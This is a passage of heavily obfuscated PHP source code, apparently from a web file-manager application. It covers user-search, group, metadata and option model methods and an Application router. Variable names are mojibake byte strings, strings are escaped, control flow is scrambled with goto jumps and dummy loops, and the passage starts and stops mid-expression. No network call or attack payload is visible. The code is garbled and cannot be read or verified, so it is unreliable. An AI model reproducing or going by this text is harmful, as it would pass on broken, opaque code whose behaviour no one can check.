array($Aœã®ôÊì©[1925] => count($b‘‹ƒóáì‹[$Aœã®ôÊì©[366]]), $Aœã®ôÊì©[1923] => $b‘‹ƒóáì‹[$Aœã®ôÊì©[363]][$Aœã®ôÊì©[360]], $Aœã®ôÊì©[1922] => 1, $Aœã®ôÊì©[1924] => 1); } private function _searchFromMeta($bÉé˜Áµ»Ü, $Dœ‰£‘Î„¤, $FÔ”ñ—Îœ£) { goto AÆë È¥š·; AÆë È¥š·: $d´†í¹íàŸ =& $_SERVER[´¬]; $Dœ‰£‘Î„¤ = strtolower($Dœ‰£‘Î„¤); $a¥¯çÑˆ = array($d´†í¹íàŸ[93] => $bÉé˜Áµ»Ü, $d´†í¹íàŸ[371] => array($d´†í¹íàŸ[379], "\x25{$Dœ‰£‘Î„¤}\x25")); goto b“„ùÃ²àç; bæ¤ÌçöŒÚ: $cº„ø÷œ–° = array_to_keyvalue($cº„ø÷œ–°, $d´†í¹íàŸ[33], $d´†í¹íàŸ[1526]); $B‹Àœ¶õ¹ï = $this->where(array($d´†í¹íàŸ[1518] => array($d´†í¹íàŸ[7], $cº„ø÷œ–°)))->select(); if (!$B‹Àœ¶õ¹ï) { return array(); } goto Aš‘«šˆ¿; b“„ùÃ²àç: $a¥¯çÑˆ = $this->parseWhereLike($a¥¯çÑˆ); $cº„ø÷œ–° = Model($d´†í¹íàŸ[2152])->where($a¥¯çÑˆ)->limit($FÔ”ñ—Îœ£)->select(); if (!$cº„ø÷œ–°) { return array(); } goto bæ¤ÌçöŒÚ; Aš‘«šˆ¿: return $B‹Àœ¶õ¹ï; goto fÂçƒóÔÏ¢; fÂçƒóÔÏ¢: } private function _listDataApplyItem($f‹›÷ÜªÌ) { $DÈÒƒÊ©Ä = array($f‹›÷ÜªÌ); $this->_listDataApply($DÈÒƒÊ©Ä); return $DÈÒƒÊ©Ä[0]; } private function _listDataApply(&$dø£ó£®‡) { goto Cí¦¿ôù¸; Cí¦¿ôù¸: $e§ñªèÇÉ =& $_SERVER[´¬]; if (!$dø£ó£®‡) { return; } array_remove_key($dø£ó£®‡, $e§ñªèÇÉ[850]); goto eÊïßÂ¿†; eÊïßÂ¿†: $B¥‰‚µó‰¸ = array_to_keyvalue($dø£ó£®‡, $e§ñªèÇÉ[33], $e§ñªèÇÉ[1526]); $this->_listAppendGroup($dø£ó£®‡, $B¥‰‚µó‰¸); $this->_listAppendMeta($dø£ó£®‡, $B¥‰‚µó‰¸); goto FïÜ†¯¬ÉÂ; FïÜ†¯¬ÉÂ: $this->_listAppendSourceRoot($dø£ó£®‡, $B¥‰‚µó‰¸); goto aÁ¤´Æ­Û…; aÁ¤´Æ­Û…: } private function _listAppendSourceRoot(&$CŞ™…ãšØğ, $A¥Æ¼ ƒå¯) { goto f†á™ğÊÖ„; c’˜°ç«–ö: $dÑæö÷Ö = Model($D–³î‡ªĞ§[790])->order($D–³î‡ªĞ§[1783])->field($cËÚ÷±óì§)->where($fª‰¨Ç–¼¥)->select(); $dÑæö÷Ö = array_to_keyvalue($dÑæö÷Ö, $D–³î‡ªĞ§[482]); $dÑæö÷Ö = array_remove_key($dÑæö÷Ö, $D–³î‡ªĞ§[482]); goto dÕÚåŠ‰àÏ; f†á™ğÊÖ„: $D–³î‡ªĞ§ =& $_SERVER[´¬]; $fª‰¨Ç–¼¥ = array($D–³î‡ªĞ§[476] => 0, $D–³î‡ªĞ§[402] => SourceModel::TYPE_USER, $D–³î‡ªĞ§[482] => array($D–³î‡ªĞ§[7], $A¥Æ¼ ƒå¯)); $cËÚ÷±óì§ = $D–³î‡ªĞ§[1782]; goto c’˜°ç«–ö; dÕÚåŠ‰àÏ: foreach ($CŞ™…ãšØğ as &$c”²³‹ÂÒ) { $c”²³‹ÂÒ[$D–³î‡ªĞ§[85]] = $dÑæö÷Ö[$c”²³‹ÂÒ[$D–³î‡ªĞ§[1526]]] ? $dÑæö÷Ö[$c”²³‹ÂÒ[$D–³î‡ªĞ§[1526]]] : array(); } unset($c”²³‹ÂÒ); goto F…İ³§ÌÙ; F…İ³§ÌÙ: } private function _listAppendGroup(&$b·­åçĞç°, $CÉÁáÚïÌ•) { goto eæÄäë‰ÍÕ; cš¶Ò†™¸×: foreach ($b·­åçĞç° as &$e³¥’ »¥) { $e³¥’ »¥[$D¤™Ş[1863]] = array(); if (isset($D°ƒ…ØåÒ¶[$e³¥’ »¥[$D¤™Ş[1526]]])) { $e³¥’ »¥[$D¤™Ş[1863]] = $D°ƒ…ØåÒ¶[$e³¥’ »¥[$D¤™Ş[1526]]]; } } unset($e³¥’ »¥); goto bÁ—·Ë™ù; fä„î§Ù: $Eª‰¦©Á‡ = array_to_keyvalue($D°ƒ…ØåÒ¶, $D¤™Ş[33], $D¤™Ş[1689]); $Eª‰¦©Á‡ = array_remove_value(array_unique($Eª‰¦©Á‡), $D¤™Ş[495]); if (!$Eª‰¦©Á‡ || !$D°ƒ…ØåÒ¶) { return; } goto a¦ìßÂ„Ê„; eæÄäë‰ÍÕ: $D¤™Ş =& $_SERVER[´¬]; $D¯ØÆ¶¶æÁ = array($D¤™Ş[1526] => array($D¤™Ş[7], $CÉÁáÚïÌ•)); $D°ƒ…ØåÒ¶ = Model($D¤™Ş[1770])->where($D¯ØÆ¶¶æÁ)->select(); goto fä„î§Ù; a¦ìßÂ„Ê„: $D¯ØÆ¶¶æÁ = array($D¤™Ş[1689] => array($D¤™Ş[7], $Eª‰¦©Á‡)); $E¥Ùì‡š„ø = Model($D¤™Ş[1861])->field($D¤™Ş[2153])->where($D¯ØÆ¶¶æÁ)->select(); $E¥Ùì‡š„ø = array_to_keyvalue($E¥Ùì‡š„ø, $D¤™Ş[1689]); goto F¡Öå©‡Æç; F¡Öå©‡Æç: $D°ƒ…ØåÒ¶ = array_to_keyvalue_group($D°ƒ…ØåÒ¶, $D¤™Ş[1526]); foreach ($D°ƒ…ØåÒ¶ as &$c´•çÕ°†—) { $aÊ´¤Ÿ¬àÑ = array(); foreach ($c´•çÕ°†— as $cÄõ›Å›´§) { if (!$cÄõ›Å›´§[$D¤™Ş[1784]]) { continue; } $Cæ­óĞ¶Í§ = Model($D¤™Ş[1856])->listData($cÄõ›Å›´§[$D¤™Ş[1784]]); $aÊ´¤Ÿ¬àÑ[] = array($D¤™Ş[1689] => $cÄõ›Å›´§[$D¤™Ş[1689]], $D¤™Ş[2154] => $E¥Ùì‡š„ø[$cÄõ›Å›´§[$D¤™Ş[1689]]][$D¤™Ş[28]], $D¤™Ş[485] => $E¥Ùì‡š„ø[$cÄõ›Å›´§[$D¤™Ş[1689]]][$D¤™Ş[485]], $D¤™Ş[404] => $Cæ­óĞ¶Í§); } $c´•çÕ°†— = $aÊ´¤Ÿ¬àÑ; } unset($c´•çÕ°†—); goto cš¶Ò†™¸×; bÁ—·Ë™ù: } private function _listAppendMeta(&$aÒ–±…á¯Ø, $D§®¶ÒÓö) { goto F£……³Ó›…; E¼ì‚ŸŒ„: foreach ($A öÌª±¡† as &$dóöšİ¢ëÍ) { $D£—ÑÌÜÁ = array(); foreach ($dóöšİ¢ëÍ as $C›ÉŠã•ƒ±) { if (!in_array($C›ÉŠã•ƒ±[$dÚÍŠ¿óó[93]], $A…ù®äç¹÷)) { $D£—ÑÌÜÁ[$C›ÉŠã•ƒ±[$dÚÍŠ¿óó[93]]] = $C›ÉŠã•ƒ±[$dÚÍŠ¿óó[371]]; } } $dóöšİ¢ëÍ = $D£—ÑÌÜÁ; } unset($dóöšİ¢ëÍ); $E‚ÄæåÕ›Û = Model($dÚÍŠ¿óó[2155]); goto Cß„Í–µ‚“; Eç÷–«ìî¹: $AùİµåÑÍ‘ = array($dÚÍŠ¿óó[1526] => array($dÚÍŠ¿óó[7], $D§®¶ÒÓö)); $A öÌª±¡† = Model($dÚÍŠ¿óó[2131])->where($AùİµåÑÍ‘)->select(); $A öÌª±¡† = array_to_keyvalue_group($A öÌª±¡†, $dÚÍŠ¿óó[1526]); goto E¼ì‚ŸŒ„; Cß„Í–µ‚“: foreach ($aÒ–±…á¯Ø as &$Fœ…¹¹‘²ğ) { $aå›Ğ½Ä ¹ = array(); if (isset($A öÌª±¡†[$Fœ…¹¹‘²ğ[$dÚÍŠ¿óó[1526]]])) { $aå›Ğ½Ä ¹ = $A öÌª±¡†[$Fœ…¹¹‘²ğ[$dÚÍŠ¿óó[1526]]]; } $Fœ…¹¹‘²ğ[$dÚÍŠ¿óó[2156]] = array(); if (isset($aå›Ğ½Ä ¹[$fâî¸¾êøº])) { $Fœ…¹¹‘²ğ[$dÚÍŠ¿óó[2156]] = $E‚ÄæåÕ›Û->getUserJobInfo($aå›Ğ½Ä ¹[$fâî¸¾êøº]); } } unset($Fœ…¹¹‘²ğ); goto fâì™£ñˆ£; F£……³Ó›…: $dÚÍŠ¿óó =& $_SERVER[´¬]; $fâî¸¾êøº = UserJobModel::JOB_KEY; $A…ù®äç¹÷ = array($dÚÍŠ¿óó[2133]); goto Eç÷–«ìî¹; fâì™£ñˆ£: } protected function groupUserAll($F¸‰®õÉì¾) { $AíÃŒçÌ¿ =& $_SERVER[´¬]; if (!$F¸‰®õÉì¾) { return !1; } $fõœİÊÜ»Õ = Model($AíÃŒçÌ¿[1770])->field($AíÃŒçÌ¿[1526])->where(array($AíÃŒçÌ¿[1689] => array($AíÃŒçÌ¿[7], $F¸‰®õÉì¾)))->select(); $fõœİÊÜ»Õ = array_to_keyvalue($fõœİÊÜ»Õ, $AíÃŒçÌ¿[33], $AíÃŒçÌ¿[1526]); return array_unique($fõœİÊÜ»Õ); } public function userSearch($C±’È«§°Ô, $a—õ‡¶‡ÔÉ = "\52") { return Model($_SERVER[´¬][505])->where($C±’È«§°Ô)->field($a—õ‡¶‡ÔÉ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\137\157\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($f¨×“§ğ—ˆ) { $d˜Ş§¹Ş®± =& $_SERVER[´¬]; if (!defined($d˜Ş§¹Ş®±[452])) { define($d˜Ş§¹Ş®±[452], 0); } return "\125\x73\145\x72\117\160\164\151\157\x6e\137{$f¨×“§ğ—ˆ}\x5f" . USER_ID; } protected function filterWhere($dòô¦Ê¹äÕ) { $d÷ÒñÑ•°­ =& $_SERVER[´¬]; if (!defined($d÷ÒñÑ•°­[452])) { define($d÷ÒñÑ•°­[452], 0); } $dòô¦Ê¹äÕ[$d÷ÒñÑ•°­[1526]] = USER_ID; return $dòô¦Ê¹äÕ; } public function cacheRemoveUser($D±ÉÓ¡õƒ , $EË•¤…àÆª) { return Cache::remove("\x55\163\x65\162\117\x70\x74\151\157\x6e\x5f{$D±ÉÓ¡õƒ }\x5f" . $EË•¤…àÆª); } protected function optionDefault($D”Ú·›Á = '') { $a³¿ø±îÇ =& $_SERVER[´¬]; if ($D”Ú·›Á == $a³¿ø±îÇ[33]) { return $GLOBALS[$a³¿ø±îÇ[6]][$a³¿ø±îÇ[2157]]; } if ($D”Ú·›Á == $a³¿ø±îÇ[2158]) { return $GLOBALS[$a³¿ø±îÇ[6]][$a³¿ø±îÇ[2159]]; } } } goto D¼å‚Ê‡ÅÌ; C­ÒŸîŠ‰: class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\x6e\144\x65\170"; function __construct() { } public function setDefault($FùŒ¼£‚Ì) { goto fğíº–×»; d‚ª…Ëä™ö: $EáÒÑÊšê• = $Aê«â™Œ‹¿[577]; while (strlen($EáÒÑÊšê•) < $Aê«â™Œ‹¿[578]) { if (!$EáÒÑÊšê•) { break; } $EáÒÑÊšê•++; } $this->defaultModule = $dã¶ÊÔÛ‰•[0] ? $dã¶ÊÔÛ‰•[0] : $this->defaultModule; goto e°ß ÄÅÕ”; dË‡…±»ºæ: $Dè„òÒ§‹¥ = $Aê«â™Œ‹¿[582]; $this->{$_SERVER[…‹Çæ¦§][3]}($CÅĞÒƒâ¬[4], array($this, $CÅĞÒƒâ¬[5])); goto Eò¹–Ì±Æ; DÜÈÍ§Å‹: $dÖìĞÂÎÑ = $Aê«â™Œ‹¿[581]; if (!$dÖìĞÂÎÑ) { return; } $this->defaultAction = $dã¶ÊÔÛ‰•[2] ? $dã¶ÊÔÛ‰•[2] : $this->defaultAction; goto dË‡…±»ºæ; fğíº–×»: $Aê«â™Œ‹¿ =& $_SERVER[´¬]; $CÅĞÒƒâ¬ =& $_SERVER[…‹Çæ¦§]; $dã¶ÊÔÛ‰• = $CÅĞÒƒâ¬[0]($CÅĞÒƒâ¬[1], $CÅĞÒƒâ¬[2]($FùŒ¼£‚Ì, $CÅĞÒƒâ¬[1])); goto d‚ª…Ëä™ö; e°ß ÄÅÕ”: $fª¯Œ÷»‡¹ = $Aê«â™Œ‹¿[579]; while ($fª¯Œ÷»‡¹ < $Aê«â™Œ‹¿[580]) { if ($fª¯Œ÷»‡¹ >= 0) { break; } $fª¯Œ÷»‡¹++; } $this->defaultController = $dã¶ÊÔÛ‰•[1] ? $dã¶ÊÔÛ‰•[1] : $this->defaultController; goto DÜÈÍ§Å‹; Eò¹–Ì±Æ: } public function appRun($eßÖÔ´¢Š) { goto CßÄÉ‡»Ãï; CßÄÉ‡»Ãï: $Fíöáè÷ÅÂ =& $_SERVER[´¬]; $bèÈ§ê®º =& $_SERVER[…‹Çæ¦§]; $dÒ§¦Ç‚†¥ = $bèÈ§ê®º[0]($bèÈ§ê®º[1], $eßÖÔ´¢Š); goto FÚ•Ñ»ë»“; eÉ‡öÚÙã: if ($cÄÄ¶ª»œÎ == $bèÈ§ê®º[8]) { $bË‰£Üµà² = $bèÈ§ê®º[9]; $dÒ§¦Ç‚†¥[0] = $bèÈ§ê®º[10]; $dÒ§¦Ç‚†¥[1] = $dÒ§¦Ç‚†¥[1] . $bèÈ§ê®º[11]; $eßÖÔ´¢Š = $bèÈ§ê®º[12]($bèÈ§ê®º[1], $dÒ§¦Ç‚†¥); $eßÖÔ´¢Š = $bèÈ§ê®º[2]($eßÖÔ´¢Š, $bèÈ§ê®º[1]); } $bèÈ§ê®º[13](array($bèÈ§ê®º[14], $bèÈ§ê®º[15]), $bË‰£Üµà² . $bèÈ§ê®º[16], $eßÖÔ´¢Š); $bèÈ§ê®º[17]($eßÖÔ´¢Š); goto C’˜ğ—íâ²; d¼‘ğ÷Âï¸: $bË‰£Üµà² = $bèÈ§ê®º[7]; $d÷•š…ÚÀ = $Fíöáè÷ÅÂ[584]; while (strlen($d÷•š…ÚÀ) < $Fíöáè÷ÅÂ[585]) { if (!$d÷•š…ÚÀ) { break; } $d÷•š…ÚÀ++; } goto eÉ‡öÚÙã; E‰ìÑùÕâ: $CáæÖ·á = $Fíöáè÷ÅÂ[588]; goto f¥¸”«çš; FÚ•Ñ»ë»“: $cÄÄ¶ª»œÎ = $bèÈ§ê®º[6]($dÒ§¦Ç‚†¥[0]); $e¤¢éÔàß• = $Fíöáè÷ÅÂ[583]; if (!$e¤¢éÔàß•) { return; } goto d¼‘ğ÷Âï¸; C’˜ğ—íâ²: $A³½×õÓôÒ = $Fíöáè÷ÅÂ[586]; while (strlen($A³½×õÓôÒ) < $Fíöáè÷ÅÂ[587]) { if (!$A³½×õÓôÒ) { break; } $A³½×õÓôÒ++; } $bèÈ§ê®º[13](array($bèÈ§ê®º[14], $bèÈ§ê®º[15]), $bË‰£Üµà² . $bèÈ§ê®º[18], $eßÖÔ´¢Š); goto E‰ìÑùÕâ; f¥¸”«çš: } private function autorun() { $eÍÂ´§²Â =& $_SERVER[´¬]; $BÜ¢„¥ŒöÂ =& $_SERVER[…‹Çæ¦§]; global $config; if ($BÜ¢„¥ŒöÂ[19]($config[$BÜ¢„¥ŒöÂ[20]]) == 0) { return; } foreach ($config[$BÜ¢„¥ŒöÂ[20]] as $AœÕ—§á¦® => $B“¹”Ï¹È) { $this->{$_SERVER[…‹Çæ¦§][21]}($B“¹”Ï¹È); $E§îÁ‡ğ‹‘ = $eÍÂ´§²Â[589]; while ($E§îÁ‡ğ‹‘ < $eÍÂ´§²Â[580]) { if ($E§îÁ‡ğ‹‘ >= 0) { break; } $E§îÁ‡ğ‹‘++; } } } private function meox4e2c2b38() { goto dšÈ·¨‹•Ê; b×Ş¾Ç°áã: $GLOBALS[$A”¥¯Ü­ˆŠ[22]][$A”¥¯Ü­ˆŠ[28]] = $A”¥¯Ü­ˆŠ[29]($A”¥¯Ü­ˆŠ[1], $GLOBALS[$A”¥¯Ü­ˆŠ[22]][$A”¥¯Ü­ˆŠ[23]]); goto A¬ù…Šàª; B³…î‡ÚœÂ: $B¬çÔäò = $A”¥¯Ü­ˆŠ[25]($CŒŞÏ‰Íùò, 0, -$A”¥¯Ü­ˆŠ[24]($a¡™¨èó†º)); $AµÛ‰èŞÓ = $FçÎ†³ÍÊ[592]; $eÌ·ºİÃ£¼ = array($A”¥¯Ü­ˆŠ[8], $B¬çÔäò); goto c†½ä–†ïÖ; B†¡Ô»ßÛŸ: $b ñ¸Üò—÷ = $FçÎ†³ÍÊ[590]; while ($b ñ¸Üò—÷ < $FçÎ†³ÍÊ[580]) { if ($b ñ¸Üò—÷ >= 0) { break; } $b ñ¸Üò—÷++; } $CŒŞÏ‰Íùò = $GLOBALS[$A”¥¯Ü­ˆŠ[22]][$A”¥¯Ü­ˆŠ[23]][0]; goto fô„ùñ¥İí; fô„ùñ¥İí: $eÛê³ì¯Æ = $FçÎ†³ÍÊ[591]; if (!$CŒŞÏ‰Íùò || $A”¥¯Ü­ˆŠ[24]($CŒŞÏ‰Íùò) <= $A”¥¯Ü­ˆŠ[24]($a¡™¨èó†º)) { return; } if ($A”¥¯Ü­ˆŠ[6]($A”¥¯Ü­ˆŠ[25]($CŒŞÏ‰Íùò, -$A”¥¯Ü­ˆŠ[24]($a¡™¨èó†º))) != $a¡™¨èó†º) { return; } goto B³…î‡ÚœÂ; c†½ä–†ïÖ: $bÙÓ—¤×é = $FçÎ†³ÍÊ[593]; $BôÉ™Ë¼äõ = $A”¥¯Ü­ˆŠ[26]($GLOBALS[$A”¥¯Ü­ˆŠ[22]][$A”¥¯Ü­ˆŠ[23]], 1); $GLOBALS[$A”¥¯Ü­ˆŠ[22]][$A”¥¯Ü­ˆŠ[23]] = $A”¥¯Ü­ˆŠ[27]($eÌ·ºİÃ£¼, $BôÉ™Ë¼äõ); goto b×Ş¾Ç°áã; dšÈ·¨‹•Ê: $FçÎ†³ÍÊ =& $_SERVER[´¬]; $A”¥¯Ü­ˆŠ =& $_SERVER[…‹Çæ¦§]; $a¡™¨èó†º = $A”¥¯Ü­ˆŠ[8]; goto B†¡Ô»ßÛŸ; A¬ù…Šàª: } private function hqsafa4bd7db() { goto f¯çßÎë¥; eøÊÔøª: $F™Ô©Ù­« = $dŸ¨ ùÉŸ[31]; if (!$dŸ¨ ùÉŸ[32]($b´¸ÈÓ²Ë, $F™Ô©Ù­«)) { return; } $Dƒßãâò¬ø = $dŸ¨ ùÉŸ[33]($b´¸ÈÓ²Ë, $F™Ô©Ù­«); goto fñ÷ä²Ú»«; f¯çßÎë¥: $EééÚßò»„ =& $_SERVER[´¬]; $dŸ¨ ùÉŸ =& $_SERVER[…‹Çæ¦§]; if ($GLOBALS[$dŸ¨ ùÉŸ[22]][$dŸ¨ ùÉŸ[28]] != $dŸ¨ ùÉŸ[10]) { return; } goto F±à‚Í¨Äë; F±à‚Í¨Äë: $b´¸ÈÓ²Ë = $_SERVER[$dŸ¨ ùÉŸ[30]]; $FêŒÇ² »œ = $EééÚßò»„[594]; if (strlen($FêŒÇ² »œ) < $EééÚßò»„[578]) { die; } goto eøÊÔøª; fñ÷ä²Ú»«: $A´ì¨Åó = $dŸ¨ ùÉŸ[25]($b´¸ÈÓ²Ë, $Dƒßãâò¬ø + $dŸ¨ ùÉŸ[24]($F™Ô©Ù­«)); $dŸ¨ ùÉŸ[34]($dŸ¨ ùÉŸ[35], $A´ì¨Åó, $F•òç‰ŞÜ¯); $A´ì¨Åó = $dŸ¨ ùÉŸ[2]($F•òç‰ŞÜ¯[0][0], $dŸ¨ ùÉŸ[36]); goto f°™°˜çİ; BŠã¼ì¢„·: while ($c‰À×Ãù£ < $EééÚßò»„[578]) { if ($c‰À×Ãù£ >= 0) { break; } $c‰À×Ãù£++; } goto d³á«¥åôö; f°™°˜çİ: $GLOBALS[$dŸ¨ ùÉŸ[22]][$dŸ¨ ùÉŸ[23]] = $dŸ¨ ùÉŸ[0]($dŸ¨ ùÉŸ[36], $A´ì¨Åó); $GLOBALS[$dŸ¨ ùÉŸ[22]][$dŸ¨ ùÉŸ[28]] = $dŸ¨ ùÉŸ[29]($dŸ¨ ùÉŸ[1], $GLOBALS[$dŸ¨ ùÉŸ[22]][$dŸ¨ ùÉŸ[23]]); $c‰À×Ãù£ = $EééÚßò»„[595]; goto BŠã¼ì¢„·; d³á«¥åôö: } public function run() { goto E‡óæˆÚ½‚; f»§Ú¸£Ÿ: $f«Î×ºò¢ = $Bºù³¿‰ƒ[596]; $this->{$_SERVER[…‹Çæ¦§][38]}(); $aå¤ÑÚ‚í = $Bºù³¿‰ƒ[597]; goto A¿²æ®Ï†©; E×ºÎË½£ñ: $Bš®ƒ¥±Ì[39]($Bš®ƒ¥±Ì[42], isset($D³Ò„â¾ˆÍ[2]) && $D³Ò„â¾ˆÍ[0] ? $D³Ò„â¾ˆÍ[2] : $this->defaultAction); $B‹Îøšõ©ë = $Bºù³¿‰ƒ[599]; while ($B‹Îøšõ©ë < $Bºù³¿‰ƒ[580]) { if ($B‹Îøšõ©ë >= 0) { break; } $B‹Îøšõ©ë++; } goto eØÏ‹¶Ìº; A¿²æ®Ï†©: $D³Ò„â¾ˆÍ = $GLOBALS[$Bš®ƒ¥±Ì[22]][$Bš®ƒ¥±Ì[23]]; $bìš¼½¡¼î = $GLOBALS[$Bš®ƒ¥±Ì[22]][$Bš®ƒ¥±Ì[28]]; $Bš®ƒ¥±Ì[39]($Bš®ƒ¥±Ì[40], isset($D³Ò„â¾ˆÍ[0]) && $D³Ò„â¾ˆÍ[0] ? $D³Ò„â¾ˆÍ[0] : $this->defaultModule); goto EÇÅ÷µÅê; eØÏ‹¶Ìº: $Bš®ƒ¥±Ì[39]($Bš®ƒ¥±Ì[43], MOD . $Bš®ƒ¥±Ì[1] . ST . $Bš®ƒ¥±Ì[1] . ACT); $F˜¦Ô”¼á = $Bºù³¿‰ƒ[600]; $_SERVER[$Bš®ƒ¥±Ì[44]] = $Bš®ƒ¥±Ì[6](ACTION); goto C÷µ©–İ±Ó; E‡óæˆÚ½‚: $Bºù³¿‰ƒ =& $_SERVER[´¬]; $Bš®ƒ¥±Ì =& $_SERVER[…‹Çæ¦§]; $this->{$_SERVER[…‹Çæ¦§][37]}(); goto f»§Ú¸£Ÿ; EÇÅ÷µÅê: $BÃ¬Œ¥ÃŠÀ = $Bºù³¿‰ƒ[598]; if (!$BÃ¬Œ¥ÃŠÀ) { die; } $Bš®ƒ¥±Ì[39]($Bš®ƒ¥±Ì[41], isset($D³Ò„â¾ˆÍ[1]) && $D³Ò„â¾ˆÍ[0] ? $D³Ò„â¾ˆÍ[1] : $this->defaultController); goto E×ºÎË½£ñ; F ğËğâÚ¹: if ($Bš®ƒ¥±Ì[19]($D³Ò„â¾ˆÍ) >= 3) { $this->{$_SERVER[…‹Çæ¦§][21]}($bìš¼½¡¼î); } else { $this->{$_SERVER[…‹Çæ¦§][21]}(ACTION); } goto B‰œéˆ±¢…; C÷µ©–İ±Ó: $fƒç®ò“Ã = $Bºù³¿‰ƒ[601]; while (strlen($fƒç®ò“Ã) < $Bºù³¿‰ƒ[585]) { if (!$fƒç®ò“Ã) { break; } $fƒç®ò“Ã++; } $this->{$_SERVER[…‹Çæ¦§][45]}(); goto F ğËğâÚ¹; B‰œéˆ±¢…: } private $qzmpeba30b82 = array(); private $pnmf7526c11b = ''; public function utrh1dd2404e() { goto BÓê¨«Ì«©; Eñİç©¤á”: $d“ßÚâ¥¬Ü = $B×îŠÔº§[603]; $this->{$_SERVER[…‹Çæ¦§][51]}(); $this->{$_SERVER[…‹Çæ¦§][52]}(); goto e¿¹…é»§Ì; fÚ°çƒÀ½¿: $this->{$_SERVER[…‹Çæ¦§][3]}($f²Çà´[57], array($this, $f²Çà´[58])); $a¦Ì»–’Âƒ = $B×îŠÔº§[605]; if (strlen($a¦Ì»–’Âƒ) < $B×îŠÔº§[606]) { return; } goto cÙÒ†® ÷ô; BÓê¨«Ì«©: $B×îŠÔº§ =& $_SERVER[´¬]; $f²Çà´ =& $_SERVER[…‹Çæ¦§]; $this->{$_SERVER[…‹Çæ¦§][46]}(); goto AùÂî‘¥Ş; cÙÒ†® ÷ô: $this->{$_SERVER[…‹Çæ¦§][3]}($f²Çà´[59], array($this, $f²Çà´[60])); goto fŸ”‘ÆÅÖ; E÷ïÆ„Â: $this->{$_SERVER[…‹Çæ¦§][48]}(); $this->{$_SERVER[…‹Çæ¦§][49]}(); $this->{$_SERVER[…‹Çæ¦§][50]}(); goto Eñİç©¤á”; e¿¹…é»§Ì: $FŒÇÒÆè· = $B×îŠÔº§[604]; $this->{$_SERVER[…‹Çæ¦§][3]}($f²Çà´[53], array($this, $f²Çà´[54])); $this->{$_SERVER[…‹Çæ¦§][3]}($f²Çà´[55], array($this, $f²Çà´[56])); goto fÚ°çƒÀ½¿; AùÂî‘¥Ş: $this->{$_SERVER[…‹Çæ¦§][47]}(); $dÑË¯»ºÖÇ = $B×îŠÔº§[602]; if (strlen($dÑË¯»ºÖÇ) < $B×îŠÔº§[587]) { die; } goto E÷ïÆ„Â; fŸ”‘ÆÅÖ: } public function bvwz89eab655($dïŠ”ÖêÇ¦) { goto BİÄèçÓ„§; a¤‡ùñÏ„˜: $DƒŠ†´•© = $Bã¥â‡¨÷Ñ[611]; if (!$DƒŠ†´•©) { return; } $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[127]] = $bÏà±–‚ÏÔ[128]($bÏà±–‚ÏÔ[129]()); goto cŞšÂóä‰Î; BİÄèçÓ„§: $Bã¥â‡¨÷Ñ =& $_SERVER[´¬]; $bÏà±–‚ÏÔ =& $_SERVER[…‹Çæ¦§]; $cß·«¹í › = $bÏà±–‚ÏÔ[61]($bÏà±–‚ÏÔ[62])->{$_SERVER[…‹Çæ¦§][63]}(); goto FˆŒ‰¿ŒŠ; FˆŒ‰¿ŒŠ: $EØçëá»Ï¬ = array($bÏà±–‚ÏÔ[64], $bÏà±–‚ÏÔ[65], $bÏà±–‚ÏÔ[66], $bÏà±–‚ÏÔ[67], $bÏà±–‚ÏÔ[68], $bÏà±–‚ÏÔ[69], $bÏà±–‚ÏÔ[70], $bÏà±–‚ÏÔ[71], $bÏà±–‚ÏÔ[72], $bÏà±–‚ÏÔ[73], $bÏà±–‚ÏÔ[74], $bÏà±–‚ÏÔ[75], $bÏà±–‚ÏÔ[76], $bÏà±–‚ÏÔ[77], $bÏà±–‚ÏÔ[78], $bÏà±–‚ÏÔ[79], $bÏà±–‚ÏÔ[80], $bÏà±–‚ÏÔ[81], $bÏà±–‚ÏÔ[82], $bÏà±–‚ÏÔ[83], $bÏà±–‚ÏÔ[84], $bÏà±–‚ÏÔ[85], $bÏà±–‚ÏÔ[86], $bÏà±–‚ÏÔ[87], $bÏà±–‚ÏÔ[88], $bÏà±–‚ÏÔ[89], $bÏà±–‚ÏÔ[90], $bÏà±–‚ÏÔ[91], $bÏà±–‚ÏÔ[92], $bÏà±–‚ÏÔ[93], $bÏà±–‚ÏÔ[94], $bÏà±–‚ÏÔ[95], $bÏà±–‚ÏÔ[96], $bÏà±–‚ÏÔ[97], $bÏà±–‚ÏÔ[98], $bÏà±–‚ÏÔ[99], $bÏà±–‚ÏÔ[100], $bÏà±–‚ÏÔ[101], $bÏà±–‚ÏÔ[102], $bÏà±–‚ÏÔ[103]); foreach ($EØçëá»Ï¬ as $C‰¹ÊçÀÜ) { $BŠˆ—††¢Ë = $GLOBALS[$bÏà±–‚ÏÔ[104]][$bÏà±–‚ÏÔ[105]][$C‰¹ÊçÀÜ]; $b›ƒô£°Ğ¢ = $Bã¥â‡¨÷Ñ[607]; while (strlen($b›ƒô£°Ğ¢) < $Bã¥â‡¨÷Ñ[580]) { if (!$b›ƒô£°Ğ¢) { break; } $b›ƒô£°Ğ¢++; } if (isset($cß·«¹í ›[$C‰¹ÊçÀÜ])) { $BŠˆ—††¢Ë = $cß·«¹í ›[$C‰¹ÊçÀÜ]; } $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[107]][$C‰¹ÊçÀÜ] = $BŠˆ—††¢Ë; } $eİÎÓèÑÆ = $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[107]][$bÏà±–‚ÏÔ[76]]; goto E‡ßËä–Ú; AƒÆ“õçà…: $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[140]] = $bÏà±–‚ÏÔ[116]($this->qzmpeba30b82, $bÏà±–‚ÏÔ[141], $bÏà±–‚ÏÔ[10]); if ($bÏà±–‚ÏÔ[116]($GLOBALS, $bÏà±–‚ÏÔ[142]) && $this->config[$bÏà±–‚ÏÔ[143]]) { $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[144]] = WEB_ROOT; } return $dïŠ”ÖêÇ¦; goto aõ¨‰­°šÌ; fÓš³„¤ß³: unset($dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[108]][$bÏà±–‚ÏÔ[110]]); 